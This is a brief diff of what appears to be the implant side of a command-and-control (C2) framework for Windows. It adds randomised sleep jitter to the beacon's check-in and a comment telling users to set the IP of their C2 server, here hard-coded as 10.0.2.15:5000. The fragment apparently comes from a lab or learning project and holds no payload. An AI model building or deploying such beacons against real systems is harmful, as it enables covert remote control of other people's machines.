@@ -36,6 +36,7 @@ int wmain()
 
         std::string checkin("{\"guido\": \"");
         std::string guid(value, BufferSize-1);
+        srand (time(NULL));
         size_t range = 200000; // 100000 + range is the maximum value you allow
         size_t number = 100000 + (rand() * range) / RAND_MAX;
         std::string sleepTimer = std::to_string(number);
@@ -47,6 +48,7 @@ int wmain()
         // if successful, connect to the server
         HTTP *client = new HTTP();
         int port = 5000, tls = 0;
+        //change this to "localhost" if testing locally, or the ip of your c2
         client->connectToServer(L"10.0.2.15", port);
         if(!client->checkConnection()){
             wprintf(L"Error, couldn't connect to server\n");
